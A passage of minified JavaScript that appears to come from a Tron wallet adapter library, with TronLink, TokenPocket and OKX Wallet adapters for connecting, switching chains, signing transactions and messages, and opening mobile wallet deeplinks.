                        try {
                            if (yield this._checkWallet(),
                            this.state === c.NotFound)
                                throw !1 !== this.config.openUrlWhenWalletNotFound && h() && window.open(this.url, "_blank"),
                                new p;
                            if (!this._supportNewTronProtocol)
                                throw new M("Current version of TronLink doesn't support switch chain operation.");
                            const e = this._wallet;
                            try {
                                yield e.request({
                                    method: "wallet_switchEthereumChain",
                                    params: [{
                                        chainId: t
                                    }]
                                })
                            } catch (t) {
                                throw new M((null == t ? void 0 : t.message) || t,t instanceof Error ? t : new Error(t))
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
                checkAndGetWallet() {
                    return Mn(this, void 0, void 0, function*() {
                        if (this.checkIfOpenTronLink(),
                        yield this._checkWallet(),
                        this.state !== c.Connected)
                            throw new g;
                        const t = this._wallet;
                        if (!t || !t.tronWeb)
                            throw new g;
                        return t
                    })
                }
                _listenTronLinkEvent() {
                    this._stopListenTronLinkEvent(),
                    window.addEventListener("message", this._tronLinkMessageHandler)
                }
                _stopListenTronLinkEvent() {
                    window.removeEventListener("message", this._tronLinkMessageHandler)
                }
                checkIfOpenTronLink() {
                    const {dappName: t="", dappIcon: e=""} = this.config;
                    if (!1 !== this.config.openTronLinkAppOnMobile && function({dappIcon: t, dappName: e}={
                        dappIcon: "",
                        dappName: ""
                    }) {
                        if (!vn() && u() && (!h() || void 0 === window.iTron)) {
                            let n = ""
                              , r = "";
                            try {
                                n = document.title;
                                const t = document.querySelector('link[rel*="icon"]');
                                t && (r = new URL(t.getAttribute("href") || "",location.href).toString())
                            } catch (t) {}
                            const {origin: i, pathname: o, search: s, hash: a} = window.location
                              , c = i + o + s + (a.includes("?") ? a : `${a}?_=1`)
                              , l = {
                                action: "open",
                                actionId: Date.now() + "",
                                callbackUrl: "http://someurl.com",
                                dappIcon: t || r,
                                dappName: e || n,
                                url: c,
                                protocol: "TronLink",
                                version: "1.0",
                                chainId: "0x2b6653dc"
                            };
                            return window.location.href = `tronlinkoutside://pull.activity?param=${encodeURIComponent(JSON.stringify(l))}`,
                            !0
                        }
                        return !1
                    }({
                        dappIcon: e,
                        dappName: t
                    }))
                        throw new p
                }
                _listenTronEvent() {
                    var t, e;
                    this._stopListenTronEvent(),
                    this._stopListenTronLinkEvent();
                    const n = this._wallet;
                    null === (t = n.on) || void 0 === t || t.call(n, "chainChanged", this._onChainChanged),
                    null === (e = n.on) || void 0 === e || e.call(n, "accountsChanged", this._onAccountsChanged)
                }
                _stopListenTronEvent() {
                    var t, e;
                    const n = this._wallet;
                    null === (t = n.removeListener) || void 0 === t || t.call(n, "chainChanged", this._onChainChanged),
                    null === (e = n.removeListener) || void 0 === e || e.call(n, "accountsChanged", this._onAccountsChanged)
                }
                _checkWallet() {
                    if (this.readyState === a.Found)
                        return Promise.resolve(!0);
                    if (this._checkPromise)
                        return this._checkPromise;
                    const t = Math.floor(20)
                      , e = Math.floor(this.config.checkTimeout / 100);
                    let n, r = 0;
                    return this._checkPromise = new Promise(i => {
                        const o = () => {
                            r++;
                            const o = r < t && !u() ? yn() : vn();
                            (o || r > e) && (n && clearInterval(n),
                            this._readyState = o ? a.Found : a.NotFound,
                            this._updateWallet(),
                            this.emit("readyStateChanged", this.readyState),
                            i(o))
                        }
                        ;
                        n = setInterval(o, 100),
                        o()
                    }
                    ),
                    this._checkPromise
                }
                checkForWalletReadyForApp() {
                    if (this.checkReadyInterval)
                        return;
                    let t = 0;
                    const e = Math.floor(this.config.checkTimeout / 200);
                    this.checkReadyInterval = setInterval( () => {
                        var n, r;
                        (window.tronLink ? null === (n = window.tronLink.tronWeb) || void 0 === n ? void 0 : n.defaultAddress : null === (r = window.tronWeb) || void 0 === r ? void 0 : r.defaultAddress) ? (this.checkReadyInterval && clearInterval(this.checkReadyInterval),
                        this.checkReadyInterval = null,
                        this._updateWallet(),
                        this.emit("connect", this.address || "")) : t > e ? (this.checkReadyInterval && clearInterval(this.checkReadyInterval),
                        this.checkReadyInterval = null) : t++
                    }
                    , 200)
                }
                setAddress(t) {
                    this._address = t
                }
                setState(t) {
                    t !== this.state && (this._state = t,
                    this.emit("stateChanged", t))
                }
            }
            ,
            tokenpocket: new class extends d {
                constructor(t={}) {
                    super(),
                    this.name = "TokenPocket",
                    this.url = "https://tokenpocket.pro/",
                    this.icon = "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTIwIiBoZWlnaHQ9IjEyMCIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGc+CjxwYXRoIGQ9Ik0xMDQxLjUyIDBILTI3VjEwMjRIMTA0MS41MlYwWiIgZmlsbD0iIzI5ODBGRSIvPgo8ZyBjbGlwLXBhdGg9InVybCgjY2xpcDBfNDA4XzIyNSkiPgo8cGF0aCBkPSJNNDA2Ljc5NiA0MzguNjQzSDQwNi45MjdDNDA2Ljc5NiA0MzcuODU3IDQwNi43OTYgNDM2Ljk0IDQwNi43OTYgNDM2LjE1NFY0MzguNjQzWiIgZmlsbD0iIzI5QUVGRiIvPgo8cGF0aCBkPSJNNjY3LjYwMiA0NjMuNTMzSDUyMy4yNDlWNzI0LjA3NkM1MjMuMjQ5IDczNi4zODkgNTMzLjIwNCA3NDYuMzQ1IDU0NS41MTcgNzQ2LjM0NUg2NDUuMzMzQzY1Ny42NDcgNzQ2LjM0NSA2NjcuNjAyIDczNi4zODkgNjY3LjYwMiA3MjQuMDc2VjQ2My41MzNaIiBmaWxsPSJ3aGl0ZSIvPgo8cGF0aCBkPSJNNDUzLjU2MyAyNzdINDQ4LjcxNkgxOTAuMjY5QzE3Ny45NTUgMjc3IDE2OCAyODYuOTU1IDE2OCAyOTkuMjY5VjM4OS42NTNDMTY4IDQwMS45NjcgMTc3Ljk1NSA0MTEuOTIyIDE5MC4yNjkgNDExLjkyMkgyNTAuOTE4SDI3NS4wMjFWNDM4LjY0NFY3MjQuNzMxQzI3NS4wMjEgNzM3LjA0NSAyODQuOTc2IDc0NyAyOTcuMjg5IDc0N0gzOTIuMTI4QzQwNC40NDEgNzQ3IDQxNC4zOTYgNzM3LjA0NSA0MTQuMzk2IDcyNC43MzFWNDM4LjY0NFY0MzYuMTU2VjQxMS45MjJINDM4LjQ5OUg0NDguMzIzSDQ1My4xN0M0OTAuMzcyIDQxMS45MjIgNTIwLjYzMSAzODEuNjYzIDUyMC42MzEgMzQ0LjQ2MUM1MjEuMDI0IDMwNy4yNTkgNDkwLjc2NSAyNzcgNDUzLjU2MyAyNzdaIiBmaWxsPSJ3aGl0ZSIvPgo8cGF0aCBkPSJNNjY3LjczNSA0NjMuNTMzVjY0NS4zNUM2NzIuNzEzIDY0Ni41MjkgNjc3LjgyMSA2NDcuNDQ2IDY4My4wNjEgNjQ4LjIzMkM2OTAuMzk3IDY0OS4yOCA2OTcuOTk0IDY0OS45MzUgNzA1LjU5MiA2NTAuMDY2QzcwNS45ODUgNjUwLjA2NiA3MDYuMzc4IDY1MC4wNjYgNzA2LjkwMiA2NTAuMDY2VjUwNS40NUM2ODUuMDI2IDUwNC4wMDkgNjY3LjczNSA0ODUuODAxIDY2Ny43MzUgNDYzLjUzM1oiIGZpbGw9InVybCgjcGFpbnQwX2xpbmVhcl80MDhfMjI1KSIvPgo8cGF0aCBkPSJNNzA5Ljc4MSAyNzdDNjA2LjgyMiAyNzcgNTIzLjI0OSAzNjAuNTczIDUyMy4yNDkgNDYzLjUzM0M1MjMuMjQ5IDU1Mi4wODQgNTg0Ljk0NiA2MjYuMjI1IDY2Ny43MzMgNjQ1LjM1VjQ2My41MzNDNjY3LjczMyA0NDAuMzQ3IDY4Ni41OTYgNDIxLjQ4NCA3MDkuNzgxIDQyMS40ODRDNzMyLjk2NyA0MjEuNDg0IDc1MS44MyA0NDAuMzQ3IDc1MS44MyA0NjMuNTMzQzc1MS44MyA0ODMuMDUxIDczOC42IDQ5OS40MjUgNzIwLjUyMyA1MDQuMTRDNzE3LjExNyA1MDUuMDU3IDcxMy40NDkgNTA1LjU4MSA3MDkuNzgxIDUwNS41ODFWNjUwLjA2NkM3MTMuNDQ5IDY1MC4wNjYgNzE2Ljk4NiA2NDkuOTM1IDcyMC41MjMgNjQ5LjgwNEM4MTguNTA1IDY0NC4xNzEgODk2LjMxNCA1NjIuOTU2IDg5Ni4zMTQgNDYzLjUzM0M4OTYuNDQ1IDM2MC41NzMgODEyLjg3MiAyNzcgNzA5Ljc4MSAyNzdaIiBmaWxsPSJ3aGl0ZSIvPgo8cGF0aCBkPSJNNzA5Ljc4IDY1MC4wNjZWNTA1LjU4MUM3MDguNzMzIDUwNS41ODEgNzA3LjgxNiA1MDUuNTgxIDcwNi43NjggNTA1LjQ1VjY1MC4wNjZDNzA3LjgxNiA2NTAuMDY2IDcwOC44NjQgNjUwLjA2NiA3MDkuNzggNjUwLjA2NloiIGZpbGw9IndoaXRlIi8+CjwvZz4KPC9nPgo8ZGVmcz4KPGxpbmVhckdyYWRpZW50IGlkPSJwYWludDBfbGluZWFyXzQwOF8yMjUiIHgxPSI3MDkuODQ0IiB5MT0iNTU2LjgyNyIgeDI9IjY2Ny43NTMiIHkyPSI1NTYuODI3IiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+CjxzdG9wIHN0b3AtY29sb3I9IndoaXRlIi8+CjxzdG9wIG9mZnNldD0iMC45NjY3IiBzdG9wLWNvbG9yPSJ3aGl0ZSIgc3RvcC1vcGFjaXR5PSIwLjMyMzMiLz4KPHN0b3Agb2Zmc2V0PSIxIiBzdG9wLWNvbG9yPSJ3aGl0ZSIgc3RvcC1vcGFjaXR5PSIwLjMiLz4KPC9saW5lYXJHcmFkaWVudD4KPGNsaXBQYXRoIGlkPSJjbGlwMF80MDhfMjI1Ij4KPHJlY3Qgd2lkdGg9IjcyOC40NDgiIGhlaWdodD0iNDcwIiBmaWxsPSJ3aGl0ZSIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMTY4IDI3NykiLz4KPC9jbGlwUGF0aD4KPC9kZWZzPgo8L3N2Zz4K",
                    this._readyState = h() ? a.Loading : a.NotFound,
                    this._state = c.Loading,
                    this.onAccountsChanged = t => {
                        const e = this.address || ""
                          , n = (null == t ? void 0 : t[0]) || "";
                        if (n) {
                            const t = n;
                            this.setAddress(t),
                            this.setState(c.Connected)
                        } else
                            this.setAddress(null),
                            this.setState(c.Disconnect);
                        this.emit("accountsChanged", this.address || "", e),
                        !e && this.address ? this.emit("connect", this.address) : e && !this.address && this.emit("disconnect")
                    }
                    ,
                    this.checkReadyInterval = null,
                    this._checkPromise = null,
                    this._updateWallet = () => {
                        var t, e, n, r, i;
                        let o = this.state
                          , s = this.address;
                        if (jn()) {
                            const a = null === (t = window.tokenpocket) || void 0 === t ? void 0 : t.tron;
                            this._wallet = u() ? {
                                tron: a,
                                ready: null === (e = window.tronWeb) || void 0 === e ? void 0 : e.ready,
                                tronWeb: null === (n = window.tokenpocket) || void 0 === n ? void 0 : n.tronWeb
                            } : {
                                tron: a,
                                ready: !!(null === (r = (null == a ? void 0 : a.tronWeb).defaultAddress) || void 0 === r ? void 0 : r.base58) || !1,
                                tronWeb: null == a ? void 0 : a.tronWeb
                            },
                            s = (null === (i = this._wallet.tronWeb.defaultAddress) || void 0 === i ? void 0 : i.base58) || null,
                            o = s ? c.Connected : c.Disconnect,
                            s || this.checkForWalletReady()
                        } else
                            this._wallet = null,
                            s = null,
                            o = c.NotFound;
                        this.setAddress(s),
                        this.setState(o)
                    }
                    ;
                    const {checkTimeout: e=2e3, openUrlWhenWalletNotFound: n=!0, openAppWithDeeplink: r=!0} = t;
                    if ("number" != typeof e)
                        throw new Error("[TokenPocketAdapter] config.checkTimeout should be a number");
                    this.config = {
                        checkTimeout: e,
                        openAppWithDeeplink: r,
                        openUrlWhenWalletNotFound: n
                    },
                    this._connecting = !1,
                    this._wallet = null,
                    this._address = null,
                    u() && jn() ? (this._readyState = a.Found,
                    this._updateWallet()) : this._checkWallet().then( () => {
                        this.connected && this.emit("connect", this.address || "")
                    }
                    )
                }
                get address() {
                    return this._address
                }
                get state() {
                    return this._state
                }
                get readyState() {
                    return this._readyState
                }
                get connecting() {
                    return this._connecting
                }
                network() {
                    return On(this, void 0, void 0, function*() {
                        try {
                            if (yield this._checkWallet(),
                            this.state !== c.Connected)
                                throw new g;
                            const t = this._wallet;
                            if (!t || !t.tronWeb)
                                throw new g;
                            try {
                                return yield In(t.tronWeb)
                            } catch (t) {
                                throw new N(null == t ? void 0 : t.message,t)
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
                connect() {
                    return On(this, void 0, void 0, function*() {
                        try {
                            if (this.checkIfOpenApp(),
                            this.connected || this.connecting)
                                return;
                            if (yield this._checkWallet(),
                            this.readyState === a.NotFound)
                                throw !1 !== this.config.openUrlWhenWalletNotFound && h() && window.open(this.url, "_blank"),
                                new p;
                            if (!this._wallet)
                                return;
                            this._connecting = !0;
                            const t = this._wallet;
                            try {
                                const e = yield t.tron.request({
                                    method: "eth_requestAccounts"
                                });
                                if (!(null == e ? void 0 : e[0]))
                                    throw new w("Request connect error.");
                                const n = e[0];
                                this.setAddress(n),
                                this.setState(c.Connected),
                                this.emit("connect", this.address || "")
                            } catch (t) {
                                throw t instanceof f ? t : new w(null == t ? void 0 : t.message,t)
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        } finally {
                            this._connecting = !1
                        }
                    })
                }
                disconnect() {
                    return On(this, void 0, void 0, function*() {
                        this.state === c.Connected && (this.setAddress(null),
                        this.setState(c.Disconnect),
                        this.emit("disconnect"))
                    })
                }
                signTransaction(t, e) {
                    return On(this, void 0, void 0, function*() {
                        try {
                            const n = yield this.checkAndGetWallet();
                            try {
                                return yield n.tronWeb.trx.sign(t, e)
                            } catch (t) {
                                throw t instanceof Error || "object" == typeof t && t.message ? new v(t.message,t) : "string" == typeof t ? new v(t,new Error(t)) : new v("Unknown error",t)
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
                multiSign(t, e, n) {
                    return On(this, void 0, void 0, function*() {
                        try {
                            const r = yield this.checkAndGetWallet();
                            try {
                                return yield r.tronWeb.trx.multiSign(t, e, n)
                            } catch (t) {
                                throw t instanceof Error || "object" == typeof t && t.message ? new v(t.message,t) : "string" == typeof t ? new v(t,new Error(t)) : new v("Unknown error",t)
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
                signMessage(t, e) {
                    return On(this, void 0, void 0, function*() {
                        try {
                            const n = yield this.checkAndGetWallet();
                            try {
                                return yield n.tronWeb.trx.signMessageV2(t, e)
                            } catch (t) {
                                throw t instanceof Error || "object" == typeof t && t.message ? new y(t.message,t) : "string" == typeof t ? new y(t,new Error(t)) : new y("Unknown error",t)
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
                listenTronEvent() {
                    if (u())
                        return;
                    this.stopListenTronEvent();
                    const t = this._wallet;
                    t && t.tron && t.tron.on("accountsChanged", this.onAccountsChanged)
                }
                stopListenTronEvent() {
                    if (u())
                        return;
                    const t = this._wallet;
                    t && t.tron && t.tron.removeListener("accountsChanged", this.onAccountsChanged)
                }
                checkAndGetWallet() {
                    return On(this, void 0, void 0, function*() {
                        if (this.checkIfOpenApp(),
                        yield this._checkWallet(),
                        !this.connected)
                            throw new g;
                        const t = this._wallet;
                        if (!t || !t.tronWeb)
                            throw new g;
                        return t
                    })
                }
                checkIfOpenApp() {
                    if (!1 !== this.config.openAppWithDeeplink && function() {
                        if (!jn() && u() && (!h() || void 0 === window.tokenpocket)) {
                            const {origin: t, pathname: e, search: n, hash: r} = window.location
                              , i = t + e + n + r
                              , o = {
                                action: "open",
                                actionId: Date.now() + "",
                                callbackUrl: "http://someurl.com",
                                blockchain: "Tron",
                                chain: "Tron",
                                url: i,
                                protocol: "TokenPocket",
                                version: "1.0"
                            };
                            return window.location.href = `tpdapp://open?params=${encodeURIComponent(JSON.stringify(o))}`,
                            !0
                        }
                        return !1
                    }())
                        throw new p
                }
                checkForWalletReady() {
                    if (this.checkReadyInterval)
                        return;
                    let t = 0;
                    const e = Math.floor(this.config.checkTimeout / 200);
                    this.checkReadyInterval = setInterval( () => {
                        var n, r, i, o;
                        if (u() && (null === (n = window.tronWeb) || void 0 === n ? void 0 : n.ready))
                            this.checkReadyInterval && clearInterval(this.checkReadyInterval),
                            this.checkReadyInterval = null,
                            this._updateWallet(),
                            this.emit("connect", this.address || "");
                        else if (null === (o = null === (i = null === (r = this._wallet) || void 0 === r ? void 0 : r.tronWeb) || void 0 === i ? void 0 : i.defaultAddress) || void 0 === o ? void 0 : o.base58) {
                            this.checkReadyInterval && clearInterval(this.checkReadyInterval),
                            this.checkReadyInterval = null,
                            this._wallet.ready = !0;
                            const t = this._wallet.tronWeb.defaultAddress.base58
                              , e = t ? c.Connected : c.Disconnect;
                            this.setAddress(t),
                            this.setState(e),
                            this.emit("connect", this.address || "")
                        } else
                            t > e ? (this.checkReadyInterval && clearInterval(this.checkReadyInterval),
                            this.checkReadyInterval = null) : t++
                    }
                    , 200)
                }
                _checkWallet() {
                    if (this.readyState === a.Found)
                        return Promise.resolve(!0);
                    if (this._checkPromise)
                        return this._checkPromise;
                    if (h() && !u())
                        return this._checkPromise = new Promise(t => {
                            const e = setTimeout( () => {
                                window.removeEventListener(gn, n),
                                this._updateWallet(),
                                jn() ? (this._readyState = a.Found,
                                t(!0)) : (this._readyState = a.NotFound,
                                t(!1)),
                                this.emit("readyStateChanged", this._readyState)
                            }
                            , this.config.checkTimeout)
                              , n = r => {
                                var i, o, s;
                                const {info: l, provider: d} = r.detail;
                                if ("TokenPocket" === l.name) {
                                    this._wallet = {
                                        ready: !!(null === (o = null === (i = d.tronWeb) || void 0 === i ? void 0 : i.defaultAddress) || void 0 === o ? void 0 : o.base58),
                                        tron: d,
                                        tronWeb: d.tronWeb
                                    },
                                    this.listenTronEvent(),
                                    this._readyState = a.Found;
                                    const r = (null === (s = this._wallet.tronWeb.defaultAddress) || void 0 === s ? void 0 : s.base58) || null
                                      , l = r ? c.Connected : c.Disconnect;
                                    this.setState(l),
                                    this.setAddress(r),
                                    this.emit("readyStateChanged", this.readyState),
                                    window.removeEventListener(gn, n),
                                    clearTimeout(e),
                                    t(!0),
                                    this.connected || this.checkForWalletReady()
                                }
                            }
                            ;
                            window.addEventListener(gn, n),
                            window.dispatchEvent(new Event("TIP6963:requestProvider"))
                        }
                        ),
                        this._checkPromise;
                    const t = Math.floor(this.config.checkTimeout / 100);
                    let e, n = 0;
                    return this._checkPromise = new Promise(r => {
                        const i = () => {
                            n++;
                            const i = jn();
                            (i || n > t) && (e && clearInterval(e),
                            this._readyState = i ? a.Found : a.NotFound,
                            this._updateWallet(),
                            this.emit("readyStateChanged", this.readyState),
                            r(i))
                        }
                        ;
                        e = setInterval(i, 100),
                        i()
                    }
                    ),
                    this._checkPromise
                }
                setAddress(t) {
                    this._address = t
                }
                setState(t) {
                    t !== this.state && (this._state = t,
                    this.emit("stateChanged", t))
                }
            }
            ,
            okx: new class extends d {
                constructor(t={}) {
                    super(),
                    this.name = "OKX Wallet",
                    this.url = "https://okx.com",
                    this.icon = "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHZpZXdCb3g9IjAgMCA0MCA0MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjQwIiBoZWlnaHQ9IjQwIiByeD0iOCIgZmlsbD0iYmxhY2siLz4KPHBhdGggZD0iTTIzLjU1ODMgMTUuODk2NUgxNi40NDc0QzE2LjE0NTMgMTUuODk2NSAxNS45MDA0IDE2LjE0MTQgMTUuOTAwNCAxNi40NDM1VjIzLjU1NDRDMTUuOTAwNCAyMy44NTY1IDE2LjE0NTMgMjQuMTAxNCAxNi40NDc0IDI0LjEwMTRIMjMuNTU4M0MyMy44NjA0IDI0LjEwMTQgMjQuMTA1MyAyMy44NTY1IDI0LjEwNTMgMjMuNTU0NFYxNi40NDM1QzI0LjEwNTMgMTYuMTQxNCAyMy44NjA0IDE1Ljg5NjUgMjMuNTU4MyAxNS44OTY1WiIgZmlsbD0id2hpdGUiLz4KPHBhdGggZD0iTTE2LjQ0NzQgMTYuMzk2NUgyMy41NTgzQzIzLjU4NDIgMTYuMzk2NSAyMy42MDUzIDE2LjQxNzUgMjMuNjA1MyAxNi40NDM1VjIzLjU1NDRDMjMuNjA1MyAyMy41ODAzIDIzLjU4NDIgMjMuNjAxNCAyMy41NTgzIDIzLjYwMTRIMTYuNDQ3NEMxNi40MjE0IDIzLjYwMTQgMTYuNDAwNCAyMy41ODAzIDE2LjQwMDQgMjMuNTU0NFYxNi40NDM1QzE2LjQwMDQgMTYuNDE3NSAxNi40MjE0IDE2LjM5NjUgMTYuNDQ3NCAxNi4zOTY1WiIgc3Ryb2tlPSJ3aGl0ZSIgc3Ryb2tlLW9wYWNpdHk9IjAuMTUiLz4KPHBhdGggZD0iTTE1LjM1MDMgNy42OTE0MUg4LjIzOTM3QzcuOTM3MjggNy42OTE0MSA3LjY5MjM4IDcuOTM2MyA3LjY5MjM4IDguMjM4NFYxNS4zNDkzQzcuNjkyMzggMTUuNjUxNCA3LjkzNzI4IDE1Ljg5NjMgOC4yMzkzNyAxNS44OTYzSDE1LjM1MDNDMTUuNjUyMyAxNS44OTYzIDE1Ljg5NzIgMTUuNjUxNCAxNS44OTcyIDE1LjM0OTNWOC4yMzg0QzE1Ljg5NzIgNy45MzYzIDE1LjY1MjMgNy42OTE0MSAxNS4zNTAzIDcuNjkxNDFaIiBmaWxsPSJ3aGl0ZSIvPgo8cGF0aCBkPSJNOC4yMzkzNyA4LjE5MTQxSDE1LjM1MDNDMTUuMzc2MiA4LjE5MTQxIDE1LjM5NzIgOC4yMTI0NSAxNS4zOTcyIDguMjM4NFYxNS4zNDkzQzE1LjM5NzIgMTUuMzc1MiAxNS4zNzYyIDE1LjM5NjMgMTUuMzUwMyAxNS4zOTYzSDguMjM5MzdDOC4yMTM0MiAxNS4zOTYzIDguMTkyMzggMTUuMzc1MiA4LjE5MjM4IDE1LjM0OTNWOC4yMzg0QzguMTkyMzggOC4yMTI0NCA4LjIxMzQyIDguMTkxNDEgOC4yMzkzNyA4LjE5MTQxWiIgc3Ryb2tlPSJ3aGl0ZSIgc3Ryb2tlLW9wYWNpdHk9IjAuMTUiLz4KPHBhdGggZD0iTTMxLjc2MDQgNy42OTE0MUgyNC42NDk1QzI0LjM0NzQgNy42OTE0MSAyNC4xMDI1IDcuOTM2MyAyNC4xMDI1IDguMjM4NFYxNS4zNDkzQzI0LjEwMjUgMTUuNjUxNCAyNC4zNDc0IDE1Ljg5NjMgMjQuNjQ5NSAxNS44OTYzSDMxLjc2MDRDMzIuMDYyNSAxNS44OTYzIDMyLjMwNzQgMTUuNjUxNCAzMi4zMDc0IDE1LjM0OTNWOC4yMzg0QzMyLjMwNzQgNy45MzYzIDMyLjA2MjUgNy42OTE0MSAzMS43NjA0IDcuNjkxNDFaIiBmaWxsPSJ3aGl0ZSIvPgo8cGF0aCBkPSJNMjQuNjQ5NSA4LjE5MTQxSDMxLjc2MDRDMzEuNzg2NCA4LjE5MTQxIDMxLjgwNzQgOC4yMTI0NSAzMS44MDc0IDguMjM4NFYxNS4zNDkzQzMxLjgwNzQgMTUuMzc1MiAzMS43ODY0IDE1LjM5NjMgMzEuNzYwNCAxNS4zOTYzSDI0LjY0OTVDMjQuNjIzNiAxNS4zOTYzIDI0LjYwMjUgMTUuMzc1MiAyNC42MDI1IDE1LjM0OTNWOC4yMzg0QzI0LjYwMjUgOC4yMTI0NCAyNC42MjM2IDguMTkxNDEgMjQuNjQ5NSA4LjE5MTQxWiIgc3Ryb2tlPSJ3aGl0ZSIgc3Ryb2tlLW9wYWNpdHk9IjAuMTUiLz4KPHBhdGggZD0iTTE1LjM1MDMgMjQuMDk5Nkg4LjIzOTM3QzcuOTM3MjggMjQuMDk5NiA3LjY5MjM4IDI0LjM0NDUgNy42OTIzOCAyNC42NDY2VjMxLjc1NzVDNy42OTIzOCAzMi4wNTk2IDcuOTM3MjggMzIuMzA0NSA4LjIzOTM3IDMyLjMwNDVIMTUuMzUwM0MxNS42NTI0IDMyLjMwNDUgMTUuODk3MyAzMi4wNTk2IDE1Ljg5NzMgMzEuNzU3NVYyNC42NDY2QzE1Ljg5NzMgMjQuMzQ0NSAxNS42NTI0IDI0LjA5OTYgMTUuMzUwMyAyNC4wOTk2WiIgZmlsbD0id2hpdGUiLz4KPHBhdGggZD0iTTguMjM5MzcgMjQuNTk5NkgxNS4zNTAzQzE1LjM3NjIgMjQuNTk5NiAxNS4zOTczIDI0LjYyMDYgMTUuMzk3MyAyNC42NDY2VjMxLjc1NzVDMTUuMzk3MyAzMS43ODM0IDE1LjM3NjIgMzEuODA0NSAxNS4zNTAzIDMxLjgwNDVIOC4yMzkzN0M4LjIxMzQyIDMxLjgwNDUgOC4xOTIzOCAzMS43ODM0IDguMTkyMzggMzEuNzU3NVYyNC42NDY2QzguMTkyMzggMjQuNjIwNiA4LjIxMzQyIDI0LjU5OTYgOC4yMzkzNyAyNC41OTk2WiIgc3Ryb2tlPSJ3aGl0ZSIgc3Ryb2tlLW9wYWNpdHk9IjAuMTUiLz4KPHBhdGggZD0iTTMxLjc2MDQgMjQuMDk5NkgyNC42NDk1QzI0LjM0NzQgMjQuMDk5NiAyNC4xMDI1IDI0LjM0NDUgMjQuMTAyNSAyNC42NDY2VjMxLjc1NzVDMjQuMTAyNSAzMi4wNTk2IDI0LjM0NzQgMzIuMzA0NSAyNC42NDk1IDMyLjMwNDVIMzEuNzYwNEMzMi4wNjI1IDMyLjMwNDUgMzIuMzA3NCAzMi4wNTk2IDMyLjMwNzQgMzEuNzU3NVYyNC42NDY2QzMyLjMwNzQgMjQuMzQ0NSAzMi4wNjI1IDI0LjA5OTYgMzEuNzYwNCAyNC4wOTk2WiIgZmlsbD0id2hpdGUiLz4KPHBhdGggZD0iTTI0LjY0OTUgMjQuNTk5NkgzMS43NjA0QzMxLjc4NjQgMjQuNTk5NiAzMS44MDc0IDI0LjYyMDYgMzEuODA3NCAyNC42NDY2VjMxLjc1NzVDMzEuODA3NCAzMS43ODM0IDMxLjc4NjQgMzEuODA0NSAzMS43NjA0IDMxLjgwNDVIMjQuNjQ5NUMyNC42MjM2IDMxLjgwNDUgMjQuNjAyNSAzMS43ODM0IDI0LjYwMjUgMzEuNzU3NVYyNC42NDY2QzI0LjYwMjUgMjQuNjIwNiAyNC42MjM2IDI0LjU5OTYgMjQuNjQ5NSAyNC41OTk2WiIgc3Ryb2tlPSJ3aGl0ZSIgc3Ryb2tlLW9wYWNpdHk9IjAuMTUiLz4KPC9zdmc+Cg==",
                    this._readyState = h() ? a.Loading : a.NotFound,
                    this._state = c.Loading,
                    this.messageHandler = t => {
                        var e, n, r;
                        const i = null === (e = t.data) || void 0 === e ? void 0 : e.message;
                        if (i)
                            if ("accountsChanged" === i.action)
                                setTimeout( () => {
                                    var t;
                                    const e = this.address || "";
                                    if (null === (t = this._wallet) || void 0 === t ? void 0 : t.ready) {
                                        const t = i.data.address;
                                        this.setAddress(t),
                                        this.setState(c.Connected)
                                    } else
                                        this.setAddress(null),
                                        this.setState(c.Disconnect);
                                    (this.address || "") !== e && this.emit("accountsChanged", this.address || "", e),
                                    !e && this.address ? this.emit("connect", this.address) : e && !this.address && this.emit("disconnect")
                                }
                                , 200);
                            else if ("connect" === i.action) {
                                const t = this.connected
                                  , e = this.address || ""
                                  , i = (null === (r = null === (n = this._wallet.tronWeb) || void 0 === n ? void 0 : n.defaultAddress) || void 0 === r ? void 0 : r.base58) || "";
                                this.setAddress(i),
                                this.setState(c.Connected),
                                t ? i !== e && this.emit("accountsChanged", this.address || "", e) : this.emit("connect", i)
                            } else
                                "disconnect" === i.action && (this.setAddress(null),
                                this.setState(c.Disconnect),
                                this.emit("disconnect"))
                    }
                    ,
                    this._checkPromise = null,
                    this._updateWallet = () => {
                        var t, e;
                        let n = this.state
                          , r = this.address;
                        Un() ? (this._wallet = window.okxwallet.tronLink,
                        this._listenEvent(),
                        r = (null === (e = null === (t = this._wallet.tronWeb) || void 0 === t ? void 0 : t.defaultAddress) || void 0 === e ? void 0 : e.base58) || null,
                        n = this._wallet.ready ? c.Connected : c.Disconnect) : (this._wallet = null,
                        r = null,
                        n = c.NotFound),
                        this.setAddress(r),
                        this.setState(n)
                    }
                    ;
                    const {checkTimeout: e=2e3, openUrlWhenWalletNotFound: n=!0, openAppWithDeeplink: r=!0} = t;
                    if ("number" != typeof e)
                        throw new Error("[OkxWalletAdapter] config.checkTimeout should be a number");
                    if (this.config = {
                        checkTimeout: e,
                        openAppWithDeeplink: r,
                        openUrlWhenWalletNotFound: n
                    },
                    this._connecting = !1,
                    this._wallet = null,
                    this._address = null,
                    !h())
                        return this._readyState = a.NotFound,
                        void this.setState(c.NotFound);
                    Un() ? (this._readyState = a.Found,
                    this._updateWallet()) : this._checkWallet().then( () => {
                        this.connected && this.emit("connect", this.address || "")
                    }
                    )
                }
                get address() {
                    return this._address
                }
                get state() {
                    return this._state
                }
                get readyState() {
                    return this._readyState
                }
                get connecting() {
                    return this._connecting
                }
                network() {
                    return Wn(this, void 0, void 0, function*() {
                        try {
                            if (yield this._checkWallet(),
                            this.state !== c.Connected)
                                throw new g;
                            const t = this._wallet;
                            if (!t || !t.tronWeb)
                                throw new g;
                            try {
                                return yield In(t.tronWeb)
                            } catch (t) {
